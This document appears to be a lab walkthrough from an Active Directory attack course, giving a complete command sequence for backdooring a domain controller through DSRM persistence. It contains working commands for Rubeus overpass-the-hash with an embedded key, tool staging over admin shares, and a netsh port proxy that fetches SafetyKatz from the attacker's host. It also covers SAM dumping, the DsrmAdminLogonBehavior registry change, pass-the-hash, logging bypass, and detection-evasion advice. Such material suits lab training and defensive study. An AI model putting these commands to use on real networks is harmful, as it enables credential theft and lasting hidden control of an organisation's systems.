# Attack - DSRM Persistence (DC Backdoor)

**Date:** Friday, August 25, 2026
**Topic:** Abusing DSRM Administrator for Persistent DC Access & Backdoor

---

## Objective

**Goal:** Establish persistent backdoor access to Domain Controller via DSRM administrator abuse

**Progression:**
```
Obtain Domain Admin privileges
    ↓
Create DA-privileged process
    ↓
Copy tools to DC
    ↓
Extract DSRM administrator credentials from SAM hive
    ↓
Modify registry to allow DSRM network logon
    ↓
Use Pass-the-Hash with DSRM credentials
    ↓
Persistent DC access established (even if DA creds reset)
```

---

## Prerequisites

- Domain Admin privileges (from previous attack phases)
- Access to dcorp-dc (via reverse shell, WinRM, or PSRemoting)
- svcadmin AES256 key: `6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011`
- Loader.exe tool
- SafetyKatz.exe tool
- Rubeus.exe tool
- Network access to DC (port 8080 for port forwarding)
- Knowledge of DC IP (172.16.2.1)

---

## What is DSRM?

### Directory Services Restore Mode (DSRM)

```
DSRM = Emergency access to Domain Controller

What is it?
├─ Special boot mode for DC recovery
├─ Boots DC without Active Directory
├─ Allows recovery of corrupted Active Directory
├─ Has local administrator account (DSRM Admin)
├─ DSRM admin separate from domain admins
├─ Credentials stored in SAM hive (local)
└─ By default: Cannot logon via network

Why it's powerful for persistence?
├─ Independent credentials (separate from domain)
├─ If domain admin password reset → Still have DSRM access
├─ SAM stored locally → Harder to detect
├─ NTLM hash can be used for Pass-the-Hash
├─ Not in normal user logon path
├─ Often overlooked in incident response
└─ Persistent backdoor access
```

---

## DSRM vs Domain Admin

### Comparison

| Aspect | Domain Admin | DSRM Admin |
|---|---|---|
| **Storage** | Active Directory | Local SAM hive |
| **Extraction** | DCSync | SAM dump |
| **Password Change** | Via AD administration | Manual DC boot |
| **Network Logon** | Default allowed | Default NOT allowed |
| **Detection** | Monitored | Often missed |
| **Persistence** | Reset-able | Independent |
| **Use Case** | Domain operations | DC recovery |
| **Access Level** | Domain-wide | DC local admin |

---

### Why DSRM Persistence is Powerful

```
Scenario 1: Incident Response (Baseline Assumption)
├─ Attacker detected with DA credentials
├─ Response: Reset all DA passwords
├─ Attacker consequence: LOCKED OUT
└─ Persistence lost

Scenario 2: DSRM Persistence (Smart Attacker)
├─ Attacker detected with DA credentials
├─ Attacker uses DA to extract DSRM admin hash
├─ Attacker modifies registry for DSRM network logon
├─ Response: Reset all DA passwords
├─ Attacker consequence: STILL HAS ACCESS (via DSRM)
├─ Attacker accesses DC as DSRM admin
├─ Incident response team misses DSRM backdoor
└─ Persistence maintained indefinitely
```

---

## Phase 1: Create DA-Privileged Process

### Use OverPass-the-Hash with svcadmin

**Start new process with Domain Admin privileges:**

```powershell
# Create DA process using svcadmin's AES256 key
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt `
  /user:svcadmin `
  /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 `
  /opsec `
  /createnetonly:C:\Windows\System32\cmd.exe `
  /show `
  /ppt

# Output:
# [+] TGT created for svcadmin
# [+] New cmd.exe process created
# [+] Ticket injected
# [+] Domain Admin context ready

# New cmd.exe window opens
# Run all subsequent commands in this new process
```

---

**What this creates:**
- New cmd.exe process
- Inherits svcadmin's TGT (Domain Admin)
- Isolated from current session
- Ready for remote operations

---

## Phase 2: Copy Tools to DC

### Copy Loader.exe via SMB

**From DA-privileged cmd.exe:**

```powershell
# Copy Loader.exe to DC (via admin share C$)
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

# Parameters:
# echo F = Auto-confirm all xcopy prompts
# xcopy = Copy with verification
# \\dcorp-dc\C$ = DC admin share (C$ requires admin)
# \Users\Public\ = Destination (always writable)
# /Y = Overwrite without asking

# Verify copy succeeded:
dir \\dcorp-dc\C$\Users\Public\Loader.exe
# Should show file exists with size
```

---

**Why copy this way?**
- Admin share C$ requires DA credentials (which we have)
- Loader.exe not executed on student VM (no signature)
- Copy via SMB is normal admin activity (not suspicious)
- Destination: Public folder (accessible to SYSTEM)

---

## Phase 3: Access DC and Setup Port Forwarding

### Connect to DC via WinRS

```powershell
# Connect to DC (from DA-privileged process)
winrs -r:dcorp-dc cmd

# Inside remote shell on DC:
# Now you're on dcorp-dc, run next commands here
```

---

### Add Port Forwarding on DC

**Setup netsh port proxy (8080→80):**

```powershell
# On DC (inside winrs shell)
netsh interface portproxy add v4tov4 `
  listenport=8080 `
  listenaddress=0.0.0.0 `
  connectport=80 `
  connectaddress=172.16.100.x

# Parameters:
# listenport=8080 = Local DC port to listen
# listenaddress=0.0.0.0 = Listen on all interfaces
# connectport=80 = Redirect to attacker's port 80
# connectaddress=172.16.100.x = Attacker's IP

# Verify port proxy created:
netsh interface portproxy show all
# Should show: 0.0.0.0:8080 ↔ 172.16.100.x:80
```

---

## Phase 4: Extract DSRM Administrator Credentials

### Dump SAM Hive via SafetyKatz

**Extract DSRM admin hash from SAM:**

```powershell
# On DC (inside winrs shell)
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe `
  -args "token::elevate" "lsadump::evasive-sam" "exit"

# Parameters:
# Loader.exe = Wrapper tool
# -path http://127.0.0.1:8080/SafetyKatz.exe = Download via port proxy
# token::elevate = Elevate to SYSTEM (if not already)
# lsadump::evasive-sam = Dump SAM hive (evasive mode)
# exit = Close after completion

# Output will show:
# Domain Name: DCORP-DC (local computer account)
# Administrator: a102ad5753f4c441e3af31c97fad86fd
# Guest: [disabled]
# krbtgt: [if present]
# ... other local accounts

# CRITICAL: Copy the Administrator NTLM hash
# Example: a102ad5753f4c441e3af31c97fad86fd (this is DSRM admin)
```

---

### What's Being Extracted

```
SAM Hive Contents:
├─ Local Administrator (DSRM Admin)
│  ├─ User: Administrator
│  ├─ RID: 500
│  ├─ NTLM: a102ad5753f4c441e3af31c97fad86fd ← WHAT WE NEED
│  └─ Purpose: DC local admin, separate from domain
│
├─ Guest account
│  └─ Usually disabled
│
├─ Service accounts
│  └─ SYSTEM, LOCAL SERVICE, etc.
│
└─ Other local users
   └─ If any created

Why DSRM Admin?
├─ Not connected to Active Directory
├─ Independent credentials
├─ Survives domain password resets
├─ Can be used for local admin access
├─ With registry mod: Network access
└─ Perfect for persistence
```

---

## Phase 5: Enable DSRM Network Logon

### Modify Registry on DC

**Enable DSRM administrator network access:**

```powershell
# On DC (inside winrs shell)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" `
  /v "DsrmAdminLogonBehavior" `
  /t REG_DWORD `
  /d 2 `
  /f

# Parameters:
# reg add = Add registry key
# HKLM\System\CurrentControlSet\Control\Lsa = LSA settings path
# /v DsrmAdminLogonBehavior = Registry value name
# /t REG_DWORD = Data type (32-bit integer)
# /d 2 = Value (2 = allow network logon)
# /f = Force (no confirmation)

# Value meanings:
# 0 = DSRM admin can ONLY logon locally
# 1 = DSRM admin can logon only from console
# 2 = DSRM admin can logon from network
# (2 is what we want for persistence)

# Verify registry changed:
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior
# Output should show: REG_DWORD 0x00000002 (2)
```

---

### Why This Registry Change is Critical

```
Default Behavior (DsrmAdminLogonBehavior = 0 or 1):
├─ DSRM admin login blocked from network
├─ Can only logon if DC running in DSRM
├─ Normal DC operation: No DSRM access via network
└─ Result: No persistence via DSRM

After Registry Change (DsrmAdminLogonBehavior = 2):
├─ DSRM admin can logon from network
├─ Can use Pass-the-Hash via NTLM
├─ Can access via PSRemoting, RDP, SMB
├─ Normal DC operation: DSRM access enabled
└─ Result: Persistent backdoor access
```

---

## Phase 6: Use Pass-the-Hash with DSRM Credentials

### Extract DSRM Admin Token via Mimikatz

**Use NTLM hash to gain DC access:**

```powershell
# Note: Run from elevated shell (Run as Administrator)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe `
  "sekurlsa::evasive-pth" `
  "/domain:dcorp-dc" `
  "/user:Administrator" `
  "/ntlm:a102ad5753f4c441e3af31c97fad86fd" `
  "/run:cmd.exe" `
  "exit"

# Parameters:
# sekurlsa::evasive-pth = Pass-the-Hash (evasive mode)
# /domain:dcorp-dc = DC computer name (DSRM domain)
# /user:Administrator = DSRM admin username
# /ntlm: = NTLM hash (extracted from SAM)
# /run:cmd.exe = Create process with this context
# exit = Exit after completion

# Output:
# [*] Creating new process with NTLM hash
# [+] Process created: cmd.exe
# [+] Token: DCORP-DC\Administrator
# [+] Context: DSRM Admin
# [+] New command prompt ready
```

---

### What Pass-the-Hash Does

```
Pass-the-Hash (PTH) Flow:

1. HASH → CREDENTIALS
   ├─ We have: NTLM hash (a102ad5...)
   ├─ Service needs: User credentials
   ├─ PTH converts: Hash to credential token
   └─ Method: Kerberos preauthentication (or NTLM)

2. CREATE PROCESS TOKEN
   ├─ Process: cmd.exe (new window)
   ├─ Token: Contains DSRM Admin identity
   ├─ Hash: Used to authenticate
   └─ Result: cmd.exe runs as DCORP-DC\Administrator

3. USE PROCESS
   ├─ Now: NTLM hash = valid credential
   ├─ Access: Remote services via NTLM
   ├─ Services: PSRemoting, RDP, SMB
   └─ Auth: Hash replaces password

4. BENEFIT
   ├─ No password needed (we have hash)
   ├─ Hash obtained via Pass-the-Hash
   ├─ Works because registry enabled network logon
   └─ Result: Access as DSRM administrator
```

---

## Phase 7: Access DC via PowerShell Remoting

### Modify TrustedHosts (if needed)

**On student VM (elevated PowerShell):**

```powershell
# Start Invisi-Shell to bypass logging
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# Check current TrustedHosts
Get-Item WSMan:\localhost\Client\TrustedHosts

# If it doesn't include * or DC IP, add it:
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

# Or specific IP:
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "172.16.2.1" -Concatenate -Force

# Verify:
Get-Item WSMan:\localhost\Client\TrustedHosts
# Should show: * (or DC IP)
```

---

### Connect to DC via PSRemoting

**Use NTLM authentication with DSRM admin:**

```powershell
# Connect to DC using NegotiateWithImplicitCredential
# (Uses NTLM with current process token)
Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential

# What happens:
# 1. PowerShell initiates PSRemoting to DC IP
# 2. DC sees connection attempt
# 3. NTLM authentication initiated
# 4. Process token (DSRM Admin hash) sent
# 5. DC validates NTLM hash against SAM
# 6. Authentication succeeds (hash is valid)
# 7. Remote session established
# 8. Access granted as DCORP-DC\Administrator
```

---

### Verify Access

**Inside PowerShell Remoting session:**

```powershell
# Confirm you're on DC
$env:computername
# Output: DCORP-DC

# Confirm you're DSRM admin
$env:username
# Output: Administrator

# Verify you have access
whoami
# Output: DCORP-DC\Administrator

# Check groups
whoami /groups
# Output: Administrators, SYSTEM, etc. (local groups)

# SUCCESS! DSRM admin persistence established!
```

---

## Complete DSRM Persistence Workflow

```
PHASE 1: DA Process Creation ✓
├─ Use svcadmin's AES256 key
├─ Run Rubeus asktgt
├─ Create new cmd.exe process
├─ Process inherits DA privileges
└─ New shell ready for remote ops

PHASE 2: Copy Tools to DC ✓
├─ xcopy Loader.exe to \\dcorp-dc\C$
├─ Uses admin share (requires DA)
├─ Copy to Public folder
└─ Loader.exe on DC ready

PHASE 3: Setup Infrastructure ✓
├─ Connect to DC via winrs
├─ Add netsh port proxy (8080→80)
├─ Hide outbound connections
└─ Ready for SafetyKatz

PHASE 4: Credential Extraction ✓
├─ Execute SafetyKatz via port proxy
├─ Dump SAM hive (evasive mode)
├─ Extract DSRM admin NTLM hash
├─ Example: a102ad5753f4c441e3af31c97fad86fd
└─ DSRM credentials obtained

PHASE 5: Enable Network Logon ✓
├─ Modify registry on DC
├─ DsrmAdminLogonBehavior = 2
├─ Allow DSRM network authentication
└─ Persistence preparation complete

PHASE 6: DSRM Access ✓
├─ Use Pass-the-Hash (evasive)
├─ NTLM hash: a102ad5753...
├─ Create cmd.exe with DSRM token
└─ DSRM admin process ready

PHASE 7: Remote Access ✓
├─ Modify TrustedHosts (if needed)
├─ Use PSRemoting with NegotiateWithImplicitCredential
├─ Connect to 172.16.2.1
├─ NTLM authentication via hash
└─ PSRemoting session established

RESULT: Persistent DC backdoor via DSRM
        Even if domain admin passwords reset
        DSRM admin credentials remain valid
        Network logon enabled
        Can access DC indefinitely
        Independent from domain admin
```

---

## Why DSRM Persistence is Effective

### Attacker Advantages

```
✓ Independent Credentials
  └─ Not synced with domain admin
  └─ Domain admin password reset ≠ DSRM reset

✓ SAM Storage
  └─ Local to DC
  └─ Not replicated to other DCs
  └─ Harder to detect across domain

✓ Overlooked in Recovery
  └─ Incident responders focus on domain admins
  └─ DSRM often forgotten
  └─ Can maintain access during recovery

✓ Registry Modification Subtle
  └─ Single registry value change
  └─ Not immediately suspicious
  └─ Survives basic forensics

✓ NTLM Hash Reusable
  └─ Valid for domain's lifetime
  └─ Unless password changed locally
  └─ Local password change = loss of persistence

✓ 10 Year+ Lifespan
  └─ DSRM admin rarely reset
  └─ Often forgotten account
  └─ Persists through domain changes
```

---

### Detection Challenges

```
What responders WILL check:
- Domain admin accounts ✓
- Service accounts ✓
- DA group membership ✓

What responders MIGHT MISS:
- DSRM admin account ✗
- SAM hive extract ✗
- DsrmAdminLogonBehavior registry ✗
- NTLM usage with DSRM hash ✗
- PSRemoting to DC via NTLM ✗
```

---

## Phase-by-Phase Technical Details

### Port Forwarding Mechanics

```
Without port forwarding (DETECTED):
SafetyKatz → Outbound to 172.16.100.x:80
         → Firewall detects external connection
         → EDR alert: "Suspicious outbound traffic from DC"
         → DETECTED

With port forwarding (STEALTHY):
SafetyKatz → 127.0.0.1:8080 (local)
         → netsh redirects → 172.16.100.x:80
         → Appears as internal traffic
         → Firewall sees only localhost communication
         → No external connection logged
         → UNDETECTED
```

---

### SAM Hive Extraction

```
SAM File Location: C:\Windows\System32\config\SAM

How it's accessed:
├─ During normal boot: Locked (Registry hive in use)
├─ Via Mimikatz: Direct memory access
├─ Via evasive-sam: Memory dump (no file access)
└─ Requires: SYSTEM or Administrator privileges

DSRM Admin in SAM:
├─ User: Administrator (RID 500)
├─ NTLM: Local hash (not AD hash)
├─ Separate from domain admin
├─ Set during DC installation
└─ Rarely changed (persistence gold mine)
```

---

## Troubleshooting

### If Port Proxy Fails

```
1. Already listening on port 8080
   └─ Check: netstat -an | find :8080
   └─ Fix: Use different port (e.g., 9090)

2. Firewall blocking
   └─ Check: Firewall settings
   └─ Fix: Disable or add exception

3. Permission denied
   └─ Check: Must be SYSTEM or Administrator
   └─ Fix: Run as Administrator
```

---

### If SafetyKatz Download Fails

```
1. Port proxy not working
   └─ Verify: netsh interface portproxy show all
   └─ Test: curl http://127.0.0.1:8080/test.txt

2. Web server not running on attacker
   └─ Check: Verify web server on student VM
   └─ Fix: Start HTTP server

3. Network blocked
   └─ Check: Firewall between DC and attacker
   └─ Fix: Add firewall exception
```

---

### If Registry Modification Fails

```
1. Access denied
   └─ Check: Must be on DC (winrs)
   └─ Fix: Verify winrs access

2. Path incorrect
   └─ Check: Exact path HKLM\System\CurrentControlSet...
   └─ Fix: Use correct path with backslashes

3. Reboot required
   └─ Note: Some registry changes need reboot
   └─ This change: Takes effect immediately
```

---

### If PSRemoting Fails

```
1. TrustedHosts not set
   └─ Fix: Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*"

2. NTLM authentication not working
   └─ Check: Verify -Authentication NegotiateWithImplicitCredential
   └─ Fix: Ensure current process token valid

3. DC firewall blocking
   └─ Check: Port 5985/5986 open
   └─ Fix: Enable WinRM on DC or add firewall exception
```

---

## Complete Command Sequence

```powershell
# STEP 1: Create DA process
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt `
  /user:svcadmin `
  /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 `
  /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ppt

# STEP 2: Copy tools (in new DA process)
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y

# STEP 3: Connect to DC
winrs -r:dcorp-dc cmd

# STEP 4: Setup port forwarding (on DC)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 `
  connectport=80 connectaddress=172.16.100.x

# STEP 5: Extract DSRM hash (on DC)
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe `
  -args "token::elevate" "lsadump::evasive-sam" "exit"
# Copy Administrator NTLM hash: a102ad5753f4c441e3af31c97fad86fd

# STEP 6: Enable DSRM network logon (on DC)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" `
  /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f

# STEP 7: Create DSRM admin process (on student VM, elevated)
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe `
  "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator `
  /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"

# STEP 8: Connect via PSRemoting (in DSRM admin process)
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential

# STEP 9: Verify access
$env:username
whoami /groups
```

---

## Key Takeaway

```
DSRM PERSISTENCE ATTACK:
1. Obtain domain admin privileges
2. Copy tools to DC
3. Extract DSRM administrator NTLM hash from SAM
4. Modify registry: DsrmAdminLogonBehavior = 2
5. Use Pass-the-Hash with DSRM NTLM hash
6. Connect to DC via PSRemoting using NTLM
7. DSRM backdoor established
8. Persistence: Even if DA passwords reset

Advantages:
- Independent from domain admin account
- DSRM credentials rarely changed
- Overlooked in incident response
- 10+ year persistence potential
- Network logon enabled via registry

Persistence Path:
Domain Admin → DSRM Admin → Permanent Access

Why effective:
- Domain admins reset after breach
- DSRM admin forgotten/overlooked
- Registry change simple & subtle
- NTLM hash reusable (no password needed)
- Separate credential store (SAM)
```

---

## References

- [DSRM Administrator Abuse](https://www.harmj0y.net/blog/redteaming/not-a-dctiming-attack-golden-ticket-detection/)
- [SafetyKatz - Credential Extraction](https://github.com/GhostPack/SafetyKatz)
- [Pass-the-Hash Guide](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-pass-the-ticket/)
- [DC Persistence Techniques](https://adsecurity.org/?p=2011)
- [Registry Values for LSA](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access)

---

*Next: Post-Exploitation Cleanup & Covering Tracks*
